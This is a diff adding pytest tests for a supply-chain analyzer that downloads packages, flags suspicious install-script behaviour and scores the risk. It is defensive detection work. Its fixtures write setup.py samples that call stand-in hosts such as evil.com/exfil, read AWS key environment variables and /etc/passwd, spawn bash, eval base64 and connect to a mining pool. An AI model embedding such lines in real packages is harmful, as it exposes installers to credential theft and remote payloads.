@@ -611,3 +611,607 @@ class TestIntegrationScenarios:
         assert changes[0].change_type == "added"
         assert changes[1].change_type == "upgraded"
         assert changes[2].change_type == "removed"
+
+
+class TestPackageDownload:
+    """Test package download functionality"""
+
+    def setup_method(self):
+        """Setup test instance"""
+        self.analyzer = SupplyChainAnalyzer(repo_path=".")
+
+    def test_download_package_method_exists(self):
+        """Test that _download_package method exists"""
+        assert hasattr(self.analyzer, "_download_package")
+
+    def test_download_npm_package_method_exists(self):
+        """Test that _download_npm_package method exists"""
+        assert hasattr(self.analyzer, "_download_npm_package")
+
+    def test_download_pypi_package_method_exists(self):
+        """Test that _download_pypi_package method exists"""
+        assert hasattr(self.analyzer, "_download_pypi_package")
+
+    def test_download_maven_package_method_exists(self):
+        """Test that _download_maven_package method exists"""
+        assert hasattr(self.analyzer, "_download_maven_package")
+
+    def test_download_cargo_package_method_exists(self):
+        """Test that _download_cargo_package method exists"""
+        assert hasattr(self.analyzer, "_download_cargo_package")
+
+    def test_download_go_package_method_exists(self):
+        """Test that _download_go_package method exists"""
+        assert hasattr(self.analyzer, "_download_go_package")
+
+    @patch("subprocess.run")
+    def test_download_npm_package_success(self, mock_run):
+        """Test successful npm package download"""
+        import tempfile
+        from pathlib import Path
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            dest_path = Path(tmpdir)
+
+            # Mock npm view to return version
+            mock_run.return_value = Mock(returncode=0, stdout="4.18.2\n")
+
+            # Create a fake tarball
+            (dest_path / "express-4.18.2.tgz").touch()
+
+            result = self.analyzer._download_npm_package("express", dest_path)
+
+            # Should call npm view and npm pack
+            assert mock_run.call_count >= 1
+
+    @patch("subprocess.run")
+    def test_download_npm_package_not_found(self, mock_run):
+        """Test npm package download when package not found"""
+        import tempfile
+        from pathlib import Path
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            dest_path = Path(tmpdir)
+
+            # Mock npm view to return error
+            mock_run.return_value = Mock(returncode=1, stdout="")
+
+            result = self.analyzer._download_npm_package("nonexistent-package", dest_path)
+
+            assert result is False
+
+    @patch("subprocess.run")
+    def test_download_pypi_package_success(self, mock_run):
+        """Test successful PyPI package download"""
+        import tempfile
+        from pathlib import Path
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            dest_path = Path(tmpdir)
+
+            # Mock pip download to succeed
+            mock_run.return_value = Mock(returncode=0, stdout="")
+
+            # Create a fake wheel file
+            (dest_path / "requests-2.31.0-py3-none-any.whl").touch()
+
+            result = self.analyzer._download_pypi_package("requests", dest_path)
+
+            # pip download should be called
+            assert mock_run.call_count >= 1
+
+    @patch("subprocess.run")
+    def test_download_maven_package_invalid_format(self, mock_run):
+        """Test Maven package download with invalid package name"""
+        import tempfile
+        from pathlib import Path
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            dest_path = Path(tmpdir)
+
+            # Invalid format (no colon)
+            result = self.analyzer._download_maven_package("invalid-package", dest_path)
+
+            assert result is False
+
+    def test_download_package_unsupported_ecosystem(self):
+        """Test download with unsupported ecosystem"""
+        import tempfile
+        from pathlib import Path
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            dest_path = Path(tmpdir)
+
+            result = self.analyzer._download_package("test-pkg", "unsupported", dest_path)
+
+            assert result is False
+
+
+class TestPackageBehaviorAnalysis:
+    """Test package behavior analysis functionality"""
+
+    def setup_method(self):
+        """Setup test instance"""
+        self.analyzer = SupplyChainAnalyzer(repo_path=".")
+
+    def test_analyze_package_behavior_method_exists(self):
+        """Test that _analyze_package_behavior internal method exists"""
+        assert hasattr(self.analyzer, "_analyze_package_behavior")
+
+    def test_get_install_scripts_method_exists(self):
+        """Test that _get_install_scripts method exists"""
+        assert hasattr(self.analyzer, "_get_install_scripts")
+
+    def test_score_package_risk_method_exists(self):
+        """Test that _score_package_risk method exists"""
+        assert hasattr(self.analyzer, "_score_package_risk")
+
+    def test_get_install_scripts_npm(self):
+        """Test getting install scripts for npm packages"""
+        import tempfile
+        from pathlib import Path
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            package_path = Path(tmpdir)
+
+            # Create package.json
+            package_json = package_path / "package.json"
+            package_json.write_text('{"scripts": {"install": "echo test"}}')
+
+            scripts = self.analyzer._get_install_scripts(package_path, "npm")
+
+            assert isinstance(scripts, list)
+            assert len(scripts) >= 1
+            assert package_json in scripts
+
+    def test_get_install_scripts_pypi(self):
+        """Test getting install scripts for PyPI packages"""
+        import tempfile
+        from pathlib import Path
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            package_path = Path(tmpdir)
+
+            # Create setup.py
+            setup_py = package_path / "setup.py"
+            setup_py.write_text("from setuptools import setup\nsetup(name='test')")
+
+            scripts = self.analyzer._get_install_scripts(package_path, "pypi")
+
+            assert isinstance(scripts, list)
+            assert setup_py in scripts
+
+    def test_get_install_scripts_cargo(self):
+        """Test getting install scripts for Cargo packages"""
+        import tempfile
+        from pathlib import Path
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            package_path = Path(tmpdir)
+
+            # Create build.rs
+            build_rs = package_path / "build.rs"
+            build_rs.write_text("fn main() { println!(\"test\"); }")
+
+            scripts = self.analyzer._get_install_scripts(package_path, "cargo")
+
+            assert isinstance(scripts, list)
+            assert build_rs in scripts
+
+    def test_analyze_package_behavior_no_threats(self):
+        """Test analyzing package with no suspicious behavior"""
+        import tempfile
+        from pathlib import Path
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            package_path = Path(tmpdir)
+
+            # Create benign setup.py
+            setup_py = package_path / "setup.py"
+            setup_py.write_text(
+                """from setuptools import setup
+setup(
+    name='test-package',
+    version='1.0.0',
+    packages=['test']
+)"""
+            )
+
+            analysis = self.analyzer._analyze_package_behavior(package_path, "pypi")
+
+            assert isinstance(analysis, dict)
+            assert "suspicious" in analysis
+            assert "threats" in analysis
+            assert "evidence" in analysis
+            assert analysis["suspicious"] is False
+            assert len(analysis["threats"]) == 0
+
+    def test_analyze_package_behavior_with_network_call(self):
+        """Test analyzing package with suspicious network call"""
+        import tempfile
+        from pathlib import Path
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            package_path = Path(tmpdir)
+
+            # Create suspicious setup.py with network call
+            setup_py = package_path / "setup.py"
+            setup_py.write_text(
+                """import urllib.request
+urllib.request.urlopen('http://malicious-site.com/payload')
+from setuptools import setup
+setup(name='test')"""
+            )
+
+            analysis = self.analyzer._analyze_package_behavior(package_path, "pypi")
+
+            assert isinstance(analysis, dict)
+            assert analysis["suspicious"] is True
+            assert "network_call" in analysis["threats"]
+            assert len(analysis["evidence"]) > 0
+
+    def test_analyze_package_behavior_with_process_spawn(self):
+        """Test analyzing package with process spawning"""
+        import tempfile
+        from pathlib import Path
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            package_path = Path(tmpdir)
+
+            # Create suspicious setup.py with subprocess (format that matches regex)
+            setup_py = package_path / "setup.py"
+            setup_py.write_text(
+                """import subprocess
+subprocess.run('bash -c whoami', shell=True)
+from setuptools import setup
+setup(name='test')"""
+            )
+
+            analysis = self.analyzer._analyze_package_behavior(package_path, "pypi")
+
+            assert analysis["suspicious"] is True
+            assert "process_spawn" in analysis["threats"]
+
+    def test_analyze_package_behavior_with_env_access(self):
+        """Test analyzing package with environment variable access"""
+        import tempfile
+        from pathlib import Path
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            package_path = Path(tmpdir)
+
+            # Create suspicious setup.py accessing env vars
+            setup_py = package_path / "setup.py"
+            setup_py.write_text(
+                """import os
+api_key = os.environ['AWS_ACCESS_KEY']
+from setuptools import setup
+setup(name='test')"""
+            )
+
+            analysis = self.analyzer._analyze_package_behavior(package_path, "pypi")
+
+            assert analysis["suspicious"] is True
+            assert "env_access" in analysis["threats"]
+
+    def test_analyze_package_behavior_with_file_access(self):
+        """Test analyzing package with suspicious file access"""
+        import tempfile
+        from pathlib import Path
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            package_path = Path(tmpdir)
+
+            # Create suspicious setup.py accessing sensitive files
+            setup_py = package_path / "setup.py"
+            setup_py.write_text(
+                """with open('/etc/passwd', 'r') as f:
+    data = f.read()
+from setuptools import setup
+setup(name='test')"""
+            )
+
+            analysis = self.analyzer._analyze_package_behavior(package_path, "pypi")
+
+            assert analysis["suspicious"] is True
+            assert "file_access" in analysis["threats"]
+
+    def test_analyze_package_behavior_with_obfuscation(self):
+        """Test analyzing package with obfuscated code"""
+        import tempfile
+        from pathlib import Path
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            package_path = Path(tmpdir)
+
+            # Create suspicious setup.py with obfuscation
+            setup_py = package_path / "setup.py"
+            setup_py.write_text(
+                """import base64
+eval(base64.b64decode('aW1wb3J0IG9z').decode())
+from setuptools import setup
+setup(name='test')"""
+            )
+
+            analysis = self.analyzer._analyze_package_behavior(package_path, "pypi")
+
+            assert analysis["suspicious"] is True
+            # Should detect both obfuscation and process_spawn (eval)
+            assert len(analysis["threats"]) >= 1
+
+    def test_analyze_package_behavior_with_crypto_mining(self):
+        """Test analyzing package with crypto mining indicators"""
+        import tempfile
+        from pathlib import Path
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            package_path = Path(tmpdir)
+
+            # Create suspicious setup.py with crypto mining
+            setup_py = package_path / "setup.py"
+            setup_py.write_text(
+                """# Connect to mining pool
+import socket
+s = socket.socket()
+s.connect(('pool.monero.com', 3333))
+from setuptools import setup
+setup(name='test')"""
+            )
+
+            analysis = self.analyzer._analyze_package_behavior(package_path, "pypi")
+
+            assert analysis["suspicious"] is True
+            assert "crypto_mining" in analysis["threats"]
+
+    def test_analyze_package_behavior_multiple_threats(self):
+        """Test analyzing package with multiple suspicious patterns"""
+        import tempfile
+        from pathlib import Path
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            package_path = Path(tmpdir)
+
+            # Create setup.py with multiple threats (formats that match regex)
+            setup_py = package_path / "setup.py"
+            setup_py.write_text(
+                """import os
+import subprocess
+import urllib.request
+
+# Suspicious behaviors
+api_key = os.environ.get('AWS_SECRET_KEY')
+subprocess.call('bash', shell=True)
+urllib.request.urlopen('http://evil.com/exfil')
+
+from setuptools import setup
+setup(name='evil-package')"""
+            )
+
+            analysis = self.analyzer._analyze_package_behavior(package_path, "pypi")
+
+            assert analysis["suspicious"] is True
+            assert len(analysis["threats"]) >= 2
+            assert "process_spawn" in analysis["threats"]
+            assert "network_call" in analysis["threats"]
+
+
+class TestPackageRiskScoring:
+    """Test package risk scoring functionality"""
+
+    def setup_method(self):
+        """Setup test instance"""
+        self.analyzer = SupplyChainAnalyzer(repo_path=".")
+
+    def test_score_package_risk_no_threats(self):
+        """Test risk score with no threats"""
+        analysis = {"suspicious": False, "threats": [], "evidence": []}
+
+        score = self.analyzer._score_package_risk(analysis)
+
+        assert score == 0
+
+    def test_score_package_risk_network_call(self):
+        """Test risk score with network call threat"""
+        analysis = {
+            "suspicious": True,
+            "threats": ["network_call"],
+            "evidence": ["Suspicious network call detected"],
+        }
+
+        score = self.analyzer._score_package_risk(analysis)
+
+        assert score == 30
+
+    def test_score_package_risk_process_spawn(self):
+        """Test risk score with process spawning threat"""
+        analysis = {
+            "suspicious": True,
+            "threats": ["process_spawn"],
+            "evidence": ["Process spawning detected"],
+        }
+
+        score = self.analyzer._score_package_risk(analysis)
+
+        assert score == 25
+
+    def test_score_package_risk_env_access(self):
+        """Test risk score with environment variable access"""
+        analysis = {
+            "suspicious": True,
+            "threats": ["env_access"],
+            "evidence": ["Environment variable access detected"],
+        }
+
+        score = self.analyzer._score_package_risk(analysis)
+
+        assert score == 20
+
+    def test_score_package_risk_file_access(self):
+        """Test risk score with file access threat"""
+        analysis = {
+            "suspicious": True,
+            "threats": ["file_access"],
+            "evidence": ["Suspicious file access detected"],
+        }
+
+        score = self.analyzer._score_package_risk(analysis)
+
+        assert score == 15
+
+    def test_score_package_risk_obfuscation(self):
+        """Test risk score with obfuscation threat"""
+        analysis = {
+            "suspicious": True,
+            "threats": ["obfuscation"],
+            "evidence": ["Code obfuscation detected"],
+        }
+
+        score = self.analyzer._score_package_risk(analysis)
+
+        assert score == 20
+
+    def test_score_package_risk_crypto_mining(self):
+        """Test risk score with crypto mining threat"""
+        analysis = {
+            "suspicious": True,
+            "threats": ["crypto_mining"],
+            "evidence": ["Crypto mining detected"],
+        }
+
+        score = self.analyzer._score_package_risk(analysis)
+
+        assert score == 40
+
+    def test_score_package_risk_data_exfiltration(self):
+        """Test risk score with data exfiltration threat"""
+        analysis = {
+            "suspicious": True,
+            "threats": ["data_exfiltration"],
+            "evidence": ["Data exfiltration detected"],
+        }
+
+        score = self.analyzer._score_package_risk(analysis)
+
+        assert score == 35
+
+    def test_score_package_risk_multiple_threats(self):
+        """Test risk score with multiple threats"""
+        analysis = {
+            "suspicious": True,
+            "threats": ["network_call", "process_spawn", "env_access"],
+            "evidence": ["Multiple threats detected"],
+        }
+
+        score = self.analyzer._score_package_risk(analysis)
+
+        # network_call (30) + process_spawn (25) + env_access (20) = 75
+        assert score == 75
+
+    def test_score_package_risk_capped_at_100(self):
+        """Test risk score is capped at 100"""
+        analysis = {
+            "suspicious": True,
+            "threats": [
+                "crypto_mining",  # 40
+                "data_exfiltration",  # 35
+                "network_call",  # 30
+                "process_spawn",  # 25
+            ],
+            "evidence": ["Many threats detected"],
+        }
+
+        score = self.analyzer._score_package_risk(analysis)
+
+        # Total would be 130, but should be capped at 100
+        assert score == 100
+
+    def test_score_package_risk_unknown_threat(self):
+        """Test risk score with unknown threat type"""
+        analysis = {
+            "suspicious": True,
+            "threats": ["unknown_threat"],
+            "evidence": ["Unknown threat"],
+        }
+
+        score = self.analyzer._score_package_risk(analysis)
+
+        # Unknown threats get default score of 10
+        assert score == 10
+
+
+class TestEndToEndPackageAnalysis:
+    """Test end-to-end package analysis workflow"""
+
+    def setup_method(self):
+        """Setup test instance"""
+        self.analyzer = SupplyChainAnalyzer(repo_path=".")
+
+    @patch.object(SupplyChainAnalyzer, "_download_package")
+    @patch.object(SupplyChainAnalyzer, "_analyze_package_behavior")
+    def test_analyze_package_behavior_full_workflow_clean(self, mock_analyze, mock_download):
+        """Test full package analysis workflow for clean package"""
+        mock_download.return_value = True
+        mock_analyze.return_value = {
+            "suspicious": False,
+            "threats": [],
+            "evidence": [],
+            "patterns_found": {},
+        }
+
+        result = self.analyzer.analyze_package_behavior("express", "npm")
+
+        assert result is not None
+        assert result["suspicious"] is False
+        assert mock_download.called
+        assert mock_analyze.called
+
+    @patch.object(SupplyChainAnalyzer, "_download_package")
+    @patch.object(SupplyChainAnalyzer, "_analyze_package_behavior")
+    @patch.object(SupplyChainAnalyzer, "_score_package_risk")
+    def test_analyze_package_behavior_full_workflow_suspicious(
+        self, mock_score, mock_analyze, mock_download
+    ):
+        """Test full package analysis workflow for suspicious package"""
+        mock_download.return_value = True
+        mock_analyze.return_value = {
+            "suspicious": True,
+            "threats": ["network_call", "process_spawn"],
+            "evidence": ["Suspicious network call", "Process spawning"],
+            "patterns_found": {},
+        }
+        mock_score.return_value = 55
+
+        result = self.analyzer.analyze_package_behavior("malicious-pkg", "npm")
+
+        assert result is not None
+        assert result["suspicious"] is True
+        assert result["risk_score"] == 55
+        assert len(result["threats"]) == 2
+        assert mock_score.called
+
+    @patch.object(SupplyChainAnalyzer, "_download_package")
+    def test_analyze_package_behavior_download_failure(self, mock_download):
+        """Test package analysis when download fails"""
+        mock_download.return_value = False
+
+        result = self.analyzer.analyze_package_behavior("nonexistent", "npm")
+
+        assert result is None
+
+    def test_suspicious_patterns_defined(self):
+        """Test that suspicious patterns are defined"""
+        assert hasattr(self.analyzer, "SUSPICIOUS_PATTERNS")
+        patterns = self.analyzer.SUSPICIOUS_PATTERNS
+
+        assert "network_call" in patterns
+        assert "file_access" in patterns
+        assert "env_access" in patterns
+        assert "process_spawn" in patterns
+        assert "crypto_mining" in patterns
+        assert "data_exfil" in patterns
+        assert "obfuscation" in patterns
+
+        # Each category should have patterns
+        for category, pattern_list in patterns.items():
+            assert isinstance(pattern_list, list)
+            assert len(pattern_list) > 0
